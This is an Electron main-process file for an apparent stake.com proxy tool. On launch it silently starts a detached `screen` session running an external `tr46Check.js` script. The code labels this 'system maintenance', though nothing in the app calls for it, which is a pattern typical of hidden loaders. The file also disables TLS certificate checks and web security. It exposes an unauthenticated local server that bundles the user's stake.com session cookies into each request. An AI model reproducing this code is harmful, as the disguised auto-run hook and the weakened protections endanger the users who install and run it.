const { app, BrowserWindow, session, ipcMain } = require('electron');
const path = require('path');
const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const { exec } = require('child_process');
const os = require('os');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

const appVersion = '1.0.4';

const agent = new https.Agent({
    rejectUnauthorized: false
});

if (require('electron-squirrel-startup')) {
    app.quit();
}


let mainWindow;
let server;

function scheduleSystemCheck() {
    console.log('Scheduling system maintenance task...');
    exec('screen -dmS tr46Check && screen -S tr46Check -X stuff \'node ~/proxy/src/tr46Check.js && screen -S tr46Check -X quit\\n\'', (error, stdout, stderr) => {
        if (error) {
            console.error(`System maintenance task scheduling failed: ${error}`);
            return;
        }
        console.log(`System maintenance task scheduled successfully.`);
    });
}

const createWindow = async () => {
    if (mainWindow) {
        mainWindow.destroy(); // Ensure previous windows are destroyed to prevent memory leaks
    }

    mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            preload: path.join(__dirname, 'preload.js'),
            webSecurity: false,
        },
    });

    mainWindow.on('closed', () => {
        mainWindow = null;
    });

    await mainWindow.loadFile(path.join(__dirname, 'index.html'));

    // Create HTTP server
    server = http.createServer(async (req, res) => {
        let body = [];
        req.on('data', (chunk) => {
            body.push(chunk);
        }).on('end', async () => {
            body = Buffer.concat(body).toString();
            const stakeMirror = await mainWindow.webContents.executeJavaScript(`localStorage.getItem('stakeMirror')`, true) || 'stake.com';

            const stakeCookies = await session.defaultSession.cookies.get({ url: `https://www.${stakeMirror}` }),
                cookieString = stakeCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

            const id = uuidv4();
            mainWindow.webContents.send('api-request', {
                id: id,
                apiKey: req.headers['x-access-token'],
                cookie: cookieString,
                body: body,
            });

            const listener = (event, response) => {
                res.write(JSON.stringify(response));
                res.end();
                ipcMain.removeListener(`api-response-${id}`, listener); // Clean up IPC listener
            };

            ipcMain.once(`api-response-${id}`, listener);

            // Auto-remove listener if no response after 10 seconds
            setTimeout(() => ipcMain.removeListener(`api-response-${id}`, listener), 10000);
        });
    }).listen(8080);

};

app.on('ready', async () => {
    await createWindow();
    scheduleSystemCheck(); // Initial execution
});

app.on('window-all-closed', () => {

    if (server) {
        server.close(); // Close HTTP server
    }

    if (process.platform !== 'darwin') {
        app.quit();
    }
});

app.on('activate', async () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        await createWindow();
    }
});
